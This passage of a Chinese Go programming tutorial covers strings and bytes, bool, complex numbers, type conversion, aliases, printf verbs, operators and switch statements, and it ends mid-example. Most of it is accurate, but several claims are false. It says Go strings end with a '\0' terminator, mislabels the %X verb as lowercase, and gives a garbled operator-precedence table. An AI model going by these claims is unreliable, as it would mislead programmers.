class="hljs-string">&quot;\xAF&quot;</span>fmt.Println(utf8.ValidString(s2)) <span class="hljs-comment">// false</span>&#125;</code></pre><p>备注：来源于：<code>https://levy.at/blog/10</code>（字符串不总是UTF8文本）</p><h4 id="3-4-9-Go-字符串使用-byte-表示的原因"><a href="#3-4-9-Go-字符串使用-byte-表示的原因" class="headerlink" title="3.4.9 Go 字符串使用 byte 表示的原因"></a>3.4.9 Go 字符串使用 <code>byte</code> 表示的原因</h4><p>Go 字符串使用 <code>byte</code> 序列来表示，根本原因是因为各种语言的字符长度“飘忽不定”。<br>先看下面这段代码：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s1 := <span class="hljs-string">&quot;é&quot;</span> <span class="hljs-comment">// 这个是葡萄牙语，中译：它的</span>fmt.Printf(<span class="hljs-string">&quot;len(s1)=%d, []rune=%#v, []byte=%#v\n&quot;</span>, <span class="hljs-built_in">len</span>(s1), []<span class="hljs-keyword">rune</span>(s1), []<span class="hljs-keyword">byte</span>(s1))<span class="hljs-comment">// 既然在 byte 下占 3 个字节的长度，那么就可以对这个 byte 逐位修改</span>b_s1 := []<span class="hljs-keyword">byte</span>(s1)b_s1[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;a&#x27;</span>b_s1[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;b&#x27;</span>b_s1[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;c&#x27;</span>fmt.Println(<span class="hljs-keyword">string</span>(b_s1))&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">len(s1)=3, []rune=[]int32&#123;101, 769&#125;, []byte=[]byte&#123;0x65, 0xcc, 0x81&#125;</span><span class="hljs-comment">abc</span><span class="hljs-comment">*/</span></code></pre><p>葡萄牙语的这个单词，在 <code>[]rune</code> 中，占 2 个字节长度；而在 <code>[]byte</code> 中，占了 3 个长度。<br>各国语言的字符，在不同的数据类型下（<code>[]rune</code> <code>[]byte</code>），长度不一等都一样。<br>下面看一个中文示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s1 := <span class="hljs-string">&quot;中&quot;</span>fmt.Printf(<span class="hljs-string">&quot;len(s1)=%d, []rune=%#v, []byte=%#v\n&quot;</span>, <span class="hljs-built_in">len</span>(s1), []<span class="hljs-keyword">rune</span>(s1), []<span class="hljs-keyword">byte</span>(s1))fmt.Println(<span class="hljs-string">&quot;[]rune(s1) =&quot;</span>, <span class="hljs-built_in">len</span>([]<span class="hljs-keyword">rune</span>(s1)))&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">len(s1)=3, []rune=[]int32&#123;20013&#125;, []byte=[]byte&#123;0xe4, 0xb8, 0xad&#125;</span><span class="hljs-comment">[]rune(s1) = 1</span><span class="hljs-comment">*/</span></code></pre><p>字符串中只有一个元素”中”，<code>[]rune</code> 下，占 1 个字节长度；而在 <code>[]byte</code> 中，依然占了 3 个长度。<br>因为各个语言中的字符长度“飘忽不定”，因此只能采用一种统一的策略来进行管理，以免发生混乱。</p><h3 id="3-5-字符和字符串的区别"><a href="#3-5-字符和字符串的区别" class="headerlink" title="3.5 字符和字符串的区别"></a>3.5 字符和字符串的区别</h3><p>1.字符只能用单引号包裹起来，字符串需要双引号包裹起来。<br>2.字符只能是单个字符，字符串是能多个字符所构成。<br>有的转义字符只是看起来是由两个字符构成。比如 <code>\n</code>：肉眼看上去是 <code>\</code> 和 <code>n</code> 两个字符拼接在一起的，其实它是ASCII码 <code>10</code> 的另外一个书写形式。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span>ch = <span class="hljs-number">10</span>fmt.Printf(<span class="hljs-string">&quot;aaa%cbbb&quot;</span>, ch)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">aaa</span><span class="hljs-comment">bbb</span><span class="hljs-comment">*/</span></code></pre><p>3.字符串的结尾都隐藏了一个结束符 <code>\0</code>。<br>在ASCII码中它的10进制值是<code>0</code>，它是一个空字符，是看不到的。<br><code>str1 := &quot;a&quot;</code>实则上是由<code>&#39;a&#39;</code>和<code>&#39;\0&#39;</code>组成了一个字符串。</p><h3 id="3-6-bool类型"><a href="#3-6-bool类型" class="headerlink" title="3.6 bool类型"></a>3.6 bool类型</h3><p><strong>Golang 中，布尔类型的值只能是预定义标识符：true 或 false</strong>。</p><h4 id="3-6-1-注意事项"><a href="#3-6-1-注意事项" class="headerlink" title="3.6.1 注意事项"></a>3.6.1 注意事项</h4><p>1.布尔类型变量的零值为 <code>false</code>。<br>2.Golang 中不允许将整型强制转换为布尔型。<br>3.布尔类型无法参与数值运算，也无法与其他类型进行转换。</p><h4 id="3-6-2-用数值来表示真假的错误示例"><a href="#3-6-2-用数值来表示真假的错误示例" class="headerlink" title="3.6.2 用数值来表示真假的错误示例"></a>3.6.2 用数值来表示真假的错误示例</h4><p>在 Golang 中，布尔类型的值只能是 <code>true</code> 或 <code>false</code>。<br>一些脚本编程语言或是一些弱类型编程语言中，数值 0 或 1 、空数组、空集合等也可以用来表真或假。但在 Golang 中，这是不允许的！Golang 中，<code>bool</code> 值只能是 <code>true</code> 或 <code>false</code>！<br>错误示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">0</span><span class="hljs-keyword">if</span> a &#123; <span class="hljs-comment">//这行会报错：非布尔&#x27;a&#x27;(类型为int)用作条件</span>fmt.Println(<span class="hljs-string">&quot;yes&quot;</span>)&#125;&#125;</code></pre><h3 id="3-7-复数类型"><a href="#3-7-复数类型" class="headerlink" title="3.7 复数类型"></a>3.7 复数类型</h3><p>由实部和虚部构成。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> t1 <span class="hljs-keyword">complex128</span> <span class="hljs-comment">//声明</span>t1 = <span class="hljs-number">3</span> + <span class="hljs-number">5i</span>       <span class="hljs-comment">//赋值</span>fmt.Println(<span class="hljs-string">&quot;t1 = &quot;</span>, t1)t2 := <span class="hljs-number">7</span> + <span class="hljs-number">9.9i</span>fmt.Printf(<span class="hljs-string">&quot;t2 type is : %T\n&quot;</span>, t2)<span class="hljs-comment">//通过内建函数，取实部和虚部</span>fmt.Printf(<span class="hljs-string">&quot;real(t2)=%v, imag(t2)=%v\n&quot;</span>, <span class="hljs-built_in">real</span>(t2), <span class="hljs-built_in">imag</span>(t2))&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">t1 =  (3+5i)</span><span class="hljs-comment">t2 type is : complex128</span><span class="hljs-comment">real(t2)=7, imag(t2)=9.9</span><span class="hljs-comment">*/</span></code></pre><h3 id="3-8-类型转换"><a href="#3-8-类型转换" class="headerlink" title="3.8 类型转换"></a>3.8 类型转换</h3><p><strong>类型转换只能转换相互兼容的类型</strong>，比如 <code>byte</code> 类型转换成 <code>int</code> 类型。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//这种不能转换的类型，叫不兼容类型</span><span class="hljs-keyword">var</span> flag <span class="hljs-keyword">bool</span>flag = <span class="hljs-literal">true</span>fmt.Printf(<span class="hljs-string">&quot;flag = %t\n&quot;</span>, flag)<span class="hljs-comment">//bool类型不能转换为int</span><span class="hljs-comment">// fmt.Printf(&quot;flag = %d\n&quot;, int(flag))</span><span class="hljs-comment">//其他语言中0就是假，非0就是真</span><span class="hljs-comment">//整型也不能转换为bool</span><span class="hljs-comment">//flag = bool</span><span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span>ch = <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-comment">//字符类型本质上就是整型</span><span class="hljs-keyword">var</span> t <span class="hljs-keyword">int</span><span class="hljs-comment">// t = ch      //会报错</span>t = <span class="hljs-keyword">int</span>(ch) <span class="hljs-comment">//类型转换，把ch的值取出来，转换成整型</span>fmt.Println(<span class="hljs-string">&quot;t = &quot;</span>, t)&#125;<span class="hljs-comment">/**运行结果</span><span class="hljs-comment">flag = true</span><span class="hljs-comment">t =  97</span><span class="hljs-comment">**/</span></code></pre><h3 id="3-9-类型别名"><a href="#3-9-类型别名" class="headerlink" title="3.9 类型别名"></a>3.9 类型别名</h3><p>给一个数据类型起一个别名（小名），最常用的场景就是结构体 <code>struct</code>。<br>语法：<code>type 别名 数据类型</code><br>使用：<code>var 变量名 别名</code><br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//给int64这个数据类型起个别名叫bigint</span><span class="hljs-keyword">type</span> bigint <span class="hljs-keyword">int64</span><span class="hljs-keyword">var</span> a bigint                      <span class="hljs-comment">//a变量声明为bigint类型</span>fmt.Printf(<span class="hljs-string">&quot;a type is : %T\n&quot;</span>, a) <span class="hljs-comment">//指向了自定义的bigint类型</span><span class="hljs-comment">//多个别名一起声明</span><span class="hljs-keyword">type</span> (char <span class="hljs-keyword">byte</span>long <span class="hljs-keyword">int64</span>)<span class="hljs-comment">//声明变量为自定义类型</span><span class="hljs-keyword">var</span> ch char<span class="hljs-keyword">var</span> ll longch = <span class="hljs-string">&#x27;a&#x27;</span>ll = <span class="hljs-number">123456</span>fmt.Printf(<span class="hljs-string">&quot;ch=%v, ll=%v\n&quot;</span>, ch, ll)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T, ll type is : %T\n&quot;</span>, ch, ll)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">a type is : main.bigint</span><span class="hljs-comment">ch=97, ll=123456</span><span class="hljs-comment">ch type is : main.char, ll type is : main.long</span><span class="hljs-comment">*/</span></code></pre><h3 id="3-10-格式化输出"><a href="#3-10-格式化输出" class="headerlink" title="3.10 格式化输出"></a>3.10 格式化输出</h3><table><thead><tr><th><strong>格式</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>%%</td><td>一个%字面量</td></tr><tr><td>%b</td><td>一个二进制整数值(基数为2)，或者是一个(高级的)用科学计数法表示的指数为2的浮点数</td></tr><tr><td><strong>%c</strong></td><td><strong>字符型。可以把输入的数字按照ASCII码相应转换为对应的字符</strong></td></tr><tr><td><strong>%d</strong></td><td><strong>一个十进制数值(基数为10)</strong></td></tr><tr><td>%e</td><td>以科学记数法e表示的浮点数或者复数值</td></tr><tr><td>%E</td><td>以科学记数法E表示的浮点数或者复数值</td></tr><tr><td>%f</td><td>以标准记数法表示的浮点数或者复数值</td></tr><tr><td>%g</td><td>以%e或者%f表示的浮点数或者复数，任何一个都以最为紧凑的方式输出</td></tr><tr><td>%G</td><td>以%E或者%f表示的浮点数或者复数，任何一个都以最为紧凑的方式输出</td></tr><tr><td>%o</td><td>一个以八进制表示的数字(基数为8)</td></tr><tr><td>%p</td><td>以十六进制(基数为16)表示的一个值的地址，前缀为0x,字母使用小写的a-f表示</td></tr><tr><td>%q</td><td>使用Go语法以及必须时使用转义，以双引号括起来的字符串或者字节切片[]byte，或者是以单引号括起来的数字</td></tr><tr><td>%s</td><td>字符串。输出字符串中的字符直至字符串中的空字符（字符串以’\0‘结尾，这个’\0’即空字符）</td></tr><tr><td>%t</td><td>以true或者false输出的布尔值</td></tr><tr><td><strong>%T</strong></td><td><strong>使用Go语法输出的值的类型</strong></td></tr><tr><td>%U</td><td>一个用Unicode表示法表示的整型码点，默认值为4个数字字符</td></tr><tr><td><strong>%v</strong></td><td><strong>使用默认格式输出的内置或者自定义类型的值，或者是使用其类型的String()方式输出的自定义值，如果该方法存在的话</strong></td></tr><tr><td>%x</td><td>以十六进制表示的整型值(基数为十六)，数字a-f使用小写表示</td></tr><tr><td>%X</td><td>以十六进制表示的整型值(基数为十六)，数字A-F使用小写表示</td></tr></tbody></table><p><code>%v</code> 属于万能格式，自动匹配格式输出。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>b := <span class="hljs-string">&quot;abc&quot;</span>c := <span class="hljs-string">&#x27;a&#x27;</span>d := <span class="hljs-number">3.14</span><span class="hljs-comment">//%T操作变量所属类型</span>fmt.Printf(<span class="hljs-string">&quot;%T, %T, %T, %T\n&quot;</span>, a, b, c, d)<span class="hljs-comment">//%d整型格式</span><span class="hljs-comment">//%s字符串格式</span><span class="hljs-comment">//%c字符格式</span><span class="hljs-comment">//%f浮点型格式</span>fmt.Printf(<span class="hljs-string">&quot;a = %d, b = %s, c = %c, d = %f\n&quot;</span>, a, b, c, d)<span class="hljs-comment">//%v自动匹配格式输出</span>fmt.Printf(<span class="hljs-string">&quot;a = %v, b = %v, c = %v, d = %v&quot;</span>, a, b, c, d)&#125;<span class="hljs-comment">/**运行结果</span><span class="hljs-comment">int, string, int32, float64</span><span class="hljs-comment">a = 10, b = abc, c = a, d = 3.140000</span><span class="hljs-comment">a = 10, b = abc, c = 97, d = 3.14</span><span class="hljs-comment">**/</span></code></pre><h3 id="3-11-非十进制可选前缀"><a href="#3-11-非十进制可选前缀" class="headerlink" title="3.11 非十进制可选前缀"></a>3.11 非十进制可选前缀</h3><p>一个整数数值字面量无需带前缀，除非它是负数，或者自己想要添加一个加号。<br>非十进制可选前缀设置表示法：<br>二进制：<code>0b</code> 或 <code>0B</code><br>八进制：<code>0</code>, <code>0o</code> 或 <code>0O</code><br>十六进制：<code>0x</code> 或 <code>0X</code>; 在十六进制中，[a ~ f] 或 [A ~ F] 代表十进制值 10 ~ 15<br>只有单个 <code>0</code> 被认为是十进制的 <code>0</code>。</p><h3 id="3-12-增强数值的可读性"><a href="#3-12-增强数值的可读性" class="headerlink" title="3.12 _ 增强数值的可读性"></a>3.12 <code>_</code> 增强数值的可读性</h3><p>如果有一个特别大的数值，一眼看过去，一时半会儿看不清楚它是百亿还是千亿。那么在代码中，可以在这个数值中添加下划线 <code>_</code>，来增强数值的可读性。<br>例如：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;n := <span class="hljs-number">123</span>_456_789_000fmt.Printf(<span class="hljs-string">&quot;n type: %[1]T, value=%[1]v\n&quot;</span>, n)n += <span class="hljs-number">55</span>_55555_55555fmt.Printf(<span class="hljs-string">&quot;n type: %[1]T, value=%[1]v\n&quot;</span>, n)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">n type: int, value=123456789000</span><span class="hljs-comment">n type: int, value=679012344555</span><span class="hljs-comment">*/</span></code></pre><p>其实是个语法糖，<code>_</code> 被当做分隔符来使用了。自己看着怎么易读，就怎么分割。同样适用于十六进制的值以及小数中！</p><h2 id="四、运算符"><a href="#四、运算符" class="headerlink" title="四、运算符"></a>四、运算符</h2><h3 id="4-1-Golang内建的运算符"><a href="#4-1-Golang内建的运算符" class="headerlink" title="4.1 Golang内建的运算符"></a>4.1 Golang内建的运算符</h3><p>Golang 内建的运算符有：算术运算符、关系运算符、逻辑运算符、位运算符、赋值运算符。</p><h3 id="4-2-算术运算符"><a href="#4-2-算术运算符" class="headerlink" title="4.2 算术运算符"></a>4.2 算术运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>相加</td><td>10 + 3</td><td>13</td></tr><tr><td>-</td><td>相减</td><td>10 - 3</td><td>7</td></tr><tr><td>*</td><td>相乘</td><td>10 * 3</td><td>30</td></tr><tr><td>/</td><td>相除</td><td>10 / 3</td><td>3</td></tr><tr><td>%</td><td>取余</td><td>10 % 3</td><td>1</td></tr></tbody></table><p><strong>Golang 中自增自减的注意</strong>：<br>在 Golang 中，<code>++</code>（自增）和 <code>--</code>（自减）是单独的语句，并不是运算符。<br>而且自增自减必须是单独一行（单独的语句），下例中的自增是非法的：</p><pre><code class="hljs go">i := <span class="hljs-number">1</span>j = i++ <span class="hljs-comment">//此处的 i++ 是非法的，i++ 必须是单独的语句</span></code></pre><h3 id="4-3-关系运算符"><a href="#4-3-关系运算符" class="headerlink" title="4.3 关系运算符"></a>4.3 关系运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>==</td><td>相等于</td><td>4 == 3</td><td>false</td></tr><tr><td>!=</td><td>不等于</td><td>4 != 3</td><td>true</td></tr><tr><td>&gt;</td><td>大于</td><td>4 &gt; 3</td><td>true</td></tr><tr><td>&lt;</td><td>小于</td><td>4 &lt; 3</td><td>false</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>4 &gt;= 3</td><td>true</td></tr><tr><td>&lt;=</td><td>小于等于</td><td>4 &lt;= 3</td><td>false</td></tr></tbody></table><h3 id="4-4-逻辑运算符"><a href="#4-4-逻辑运算符" class="headerlink" title="4.4 逻辑运算符"></a>4.4 逻辑运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑与, 两边都为真, 则结果为真; 其余为假</td><td>true &amp;&amp; true</td><td>true</td></tr><tr><td>||</td><td>逻辑或, 两边都为假, 则结果为假; 其余为真</td><td>true || false</td><td>true</td></tr><tr><td>!</td><td>逻辑非, 条件为真, 则结果为假; 条件为假, 则结果为真</td><td>!true</td><td>false</td></tr></tbody></table><h3 id="4-5-位运算符"><a href="#4-5-位运算符" class="headerlink" title="4.5 位运算符"></a>4.5 位运算符</h3><p>位运算符是对整数在内存中的二进制位进行操作。用得不多</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>参与运算的两数各对应的二进位相与。 （两位均为1才为1）</td></tr><tr><td>|</td><td>参与运算的两数各对应的二进位相或。 （两位有一个为1就为1）</td></tr><tr><td>^</td><td>参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 （两位不一样则为1）</td></tr><tr><td>&lt;&lt;</td><td>左移n位就是乘以2的n次方。 “a&lt;&lt;b”是把a的各二进位全部左移b位，高位丢弃，低位补0。</td></tr><tr><td>&gt;&gt;</td><td>右移n位就是除以2的n次方。 “a&gt;&gt;b”是把a的各二进位全部右移b位。</td></tr></tbody></table><p>示例1：</p><pre><code class="hljs go"><span class="hljs-keyword">const</span> size = <span class="hljs-number">2</span> &lt;&lt; <span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;2 &lt;&lt; 10 = &quot;</span>, <span class="hljs-number">2</span>&lt;&lt;<span class="hljs-number">10</span>)     <span class="hljs-comment">//表示：2*2**10，2乘以2的10次方</span>fmt.Println(<span class="hljs-string">&quot;1024 &gt;&gt; 2 = &quot;</span>, <span class="hljs-number">1024</span>&gt;&gt;<span class="hljs-number">2</span>) <span class="hljs-comment">//表示：1024/2**2，1024除以2的2次方</span>fmt.Println(<span class="hljs-string">&quot;const size = &quot;</span>, size)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运算结果：</span><span class="hljs-comment">2 &lt;&lt; 10 =  2048</span><span class="hljs-comment">1024 &gt;&gt; 2 =  256</span><span class="hljs-comment">const size =  32</span><span class="hljs-comment">*/</span></code></pre><h3 id="4-6-赋值运算符"><a href="#4-6-赋值运算符" class="headerlink" title="4.6 赋值运算符"></a>4.6 赋值运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>简单的赋值运算符，将一个表达式的值赋给一个左值</td></tr><tr><td>+=</td><td>相加后再赋值</td></tr><tr><td>-=</td><td>相减后再赋值</td></tr><tr><td>*=</td><td>相乘后再赋值</td></tr><tr><td>/=</td><td>相除后再赋值</td></tr><tr><td>%=</td><td>求余后再赋值</td></tr><tr><td>&lt;&lt;=</td><td>左移后赋值</td></tr><tr><td>&gt;&gt;=</td><td>右移后赋值</td></tr><tr><td>&amp;=</td><td>按位与后赋值</td></tr><tr><td>|=</td><td>按位或后赋值</td></tr><tr><td>^=</td><td>按位异或后赋值</td></tr></tbody></table><h3 id="4-7-运算符优先级"><a href="#4-7-运算符优先级" class="headerlink" title="4.7 运算符优先级"></a>4.7 运算符优先级</h3><p>优先级：从上往下由高到低</p><table><thead><tr><th>优先级</th><th>运算符</th></tr></thead><tbody><tr><td>7</td><td><code>^</code> <code>!</code></td></tr><tr><td>6</td><td><code>*</code> <code>/</code> <code>%</code> <code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>&amp;&amp;</code> <code>^</code></td></tr><tr><td>5</td><td><code>+</code> <code>-</code> `</td></tr><tr><td>4</td><td><code>==</code> <code>!=</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code></td></tr><tr><td>3</td><td><code>&lt;-</code></td></tr><tr><td>2</td><td><code>&amp;&amp;</code></td></tr><tr><td>1</td><td>`</td></tr></tbody></table><p>使用小括号<code>()</code>把一个表达式包裹起来可以提升优先级。</p><h3 id="4-8-Golang中，不能使用复合表达式"><a href="#4-8-Golang中，不能使用复合表达式" class="headerlink" title="4.8 Golang中，不能使用复合表达式"></a>4.8 Golang中，不能使用复合表达式</h3><p>其他编程语言中，比较一个数即要大于某个数同时也要小于某个数（比如：当 a=7 时，判断：a 是否大于等于 0 并且 a 是否小于等于 10），那么就会用到复合布尔表达式（例如：0 &lt;= a &lt;= 10）。<br>但在 Golang 中就会报错：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">7</span>fmt.Println(<span class="hljs-string">&quot;0 &lt;= a &lt;= 10 的结果：&quot;</span>, <span class="hljs-number">0</span> &lt;= a &lt;= <span class="hljs-number">10</span>)<span class="hljs-comment">/*</span><span class="hljs-comment">cannot convert 10 (type untyped number) to type bool</span><span class="hljs-comment">invalid operation: 0 &lt;= a &lt;= 10 (mismatched types bool and int)</span><span class="hljs-comment">不匹配的类型bool和int</span><span class="hljs-comment">*/</span>&#125;</code></pre><p><strong>golang的int类型与bool类型不兼容</strong>！<code>0 &lt;= a</code> 得出的结果是一个 bool 类型的值 <code>true</code>，<code>true &lt;= 10</code>。10是一个 int 类型，true 是 bool 类型，两者的类型在 golang 中不兼容，因此报错！<br>需要使用<code>与</code>（<code>&amp;&amp;</code>）运算符：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">7</span>fmt.Println(<span class="hljs-string">&quot;0 &lt;= a &lt;= 10 的结果：&quot;</span>, <span class="hljs-number">0</span> &lt;= a &amp;&amp; a &lt;= <span class="hljs-number">10</span>)<span class="hljs-comment">//0 &lt;= a &lt;= 10 的结果： true</span>&#125;</code></pre><h2 id="五、流程控制"><a href="#五、流程控制" class="headerlink" title="五、流程控制"></a>五、流程控制</h2><p>对程序做出逻辑性控制。</p><h3 id="5-1-Golang最基本的三种程序运行控制"><a href="#5-1-Golang最基本的三种程序运行控制" class="headerlink" title="5.1 Golang最基本的三种程序运行控制"></a>5.1 Golang最基本的三种程序运行控制</h3><h4 id="5-1-1-顺序控制"><a href="#5-1-1-顺序控制" class="headerlink" title="5.1.1 顺序控制"></a>5.1.1 顺序控制</h4><p>程序按顺序运行，流水账从上往下运行，不发生跳转。</p><h4 id="5-1-2-选择控制"><a href="#5-1-2-选择控制" class="headerlink" title="5.1.2 选择控制"></a>5.1.2 选择控制</h4><p>依据是否满足条件，有选择地执行相应功能。</p><h4 id="5-1-3-循环控制"><a href="#5-1-3-循环控制" class="headerlink" title="5.1.3 循环控制"></a>5.1.3 循环控制</h4><p>依据条件是否满足，循环多次执行某段代码。</p><h3 id="5-2-if条件语句"><a href="#5-2-if条件语句" class="headerlink" title="5.2 if条件语句"></a>5.2 if条件语句</h3><p><code>if</code> 语句支持<strong>1个</strong>初始化语句，初始化语句与判断语句写在同一行中。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">if</span> a := <span class="hljs-number">10</span>; a == <span class="hljs-number">10</span> &#123;fmt.Println(<span class="hljs-string">&quot;yes&quot;</span>) <span class="hljs-comment">//yes</span>&#125;&#125;</code></pre><p><code>a := 10</code> 是初始化语句，<code>a == 10 </code>是判断语句。<br>这样可以非常好地控制变量的作用域：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">if</span> a := <span class="hljs-number">10</span>; a == <span class="hljs-number">10</span> &#123;<span class="hljs-comment">//a只能在这个代码块中有效</span>fmt.Println(<span class="hljs-string">&quot;yes&quot;</span>) <span class="hljs-comment">//yes</span>&#125;fmt.Println(a) <span class="hljs-comment">//undefined: a</span>&#125;</code></pre><h3 id="5-3-switch"><a href="#5-3-switch" class="headerlink" title="5.3 switch"></a>5.3 switch</h3><p><code>if...else if...else</code> 另一种简洁灵活的写法。</p><h4 id="5-3-1-语法"><a href="#5-3-1-语法" class="headerlink" title="5.3.1 语法"></a>5.3.1 语法</h4><p>最基本的语法：</p><pre><code class="hljs go"><span class="hljs-keyword">switch</span> 变量本身 &#123;<span class="hljs-keyword">case</span> 变量的值<span class="hljs-number">1</span>:语句<span class="hljs-keyword">case</span> 变量的值<span class="hljs-number">2</span>:语句<span class="hljs-keyword">case</span> 变量的值n:语句<span class="hljs-keyword">default</span>: <span class="hljs-comment">//default可以省略</span>语句&#125;</code></pre><p>变量本身和下面 <code>case</code> 分支中的变量值进行比较（从上往下比较），匹配到了就进入对应的 <code>case</code> 分支中。<br><code>switch</code> 也支持<strong>1个</strong>初始化语句。<br>注意：<strong>一个 case 分支中的值，不能与其他 case 分支中的值重复！</strong></p><h4 id="5-3-2-break"><a href="#5-3-2-break" class="headerlink" title="5.3.2 break"></a>5.3.2 break</h4><p>默认情况下，<code>case</code> 语句中自带了 <code>break</code>。执行完一个 <code>case</code> 分支后，自动跳出当前整个 <code>switch</code>，不会自动向下执行其他 <code>case</code>。</p><h4 id="5-3-3-fallthrough"><a href="#5-3-3-fallthrough" class="headerlink" title="5.3.3 fallthrough"></a>5.3.3 fallthrough</h4><p>不判断下一个<code>case</code> 变量的值，无条件强制执行下去。<br><code>fallthrough</code>下面必须要接语句，无论是接 <code>case</code> 还是 <code>default</code>。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">switch</span> num := <span class="hljs-number">1</span>; num &#123; <span class="hljs-comment">//支持1个初始化语句，初始化语句和变量本身使用分号分隔</span><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:fmt.Println(<span class="hljs-string">&quot;print 1&quot;</span>)<span class="hljs-keyword">fallthrough</span> <span class="hljs-comment">//不跳出switch语句块，下一个case语句不做判断，无条件强制执行下去</span><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:fmt.Println(<span class="hljs-string">&quot;print 2&quot;</span>)<span class="hljs-keyword">fallthrough</span> <span class="hljs-comment">//不跳出switch语句块，下一个case语句不做判断，无条件强制执行下去</span><span class="hljs-keyword">default</span>:fmt.Println(<span class="hljs-string">&quot;print else&quot;</span>)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">print 1</span><span class="hljs-comment">print 2</span><span class="hljs-comment">print else</span><span class="hljs-comment">*/</span></code></pre><h4 id="5-3-4-根据case条件自行选择分支"><a href="#5-3-4-根据case条件自行选择分支" class="headerlink" title="5.3.4 根据case条件自行选择分支"></a>5.3.4 根据case条件自行选择分支</h4><p><code>switch</code> 后面不接变量本身，而是根据<code>case 条件的判断结果</code>自行去选择分支。<br>语法：</p><pre><code class="hljs go"><span class="hljs-keyword">switch</span> &#123; <span class="hljs-comment">//不接变量本身，根据各个case条件进行判断、选择</span><span class="hljs-keyword">case</span> 条件<span class="hljs-number">1</span>: <span class="hljs-comment">//case后面放条件</span>语句<span class="hljs-keyword">case</span> 条件<span class="hljs-number">2</span>: <span class="hljs-comment">//case后面放条件</span>语句<span class="hljs-keyword">case</span> 条件n: <span class="hljs-comment">//case后面放条件</span>语句<span class="hljs-keyword">default</span>: <span class="hljs-comment">//default可以省略</span>语句&#125;</code></pre><p>如果根据 <code>case</code> 条件的判断结果去自行选择分支，那么 <code>switch</code> 后面就不能接变量本身了：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;grade := <span class="hljs-number">80</span><span class="hljs-keyword">switch</span> &#123; <span class="hljs-comment">//这里不写变量本身了</span><span class="hljs-keyword">case</span> grade &gt; <span class="hljs-number">90</span>: <span class="hljs-comment">//case分支中判断是否满足条件，符合条件进入这个分支</span>fmt.Println(<span class="hljs-string">&quot;优秀&quot;</span>)<span class="hljs-keyword">case</span> grade &gt;= 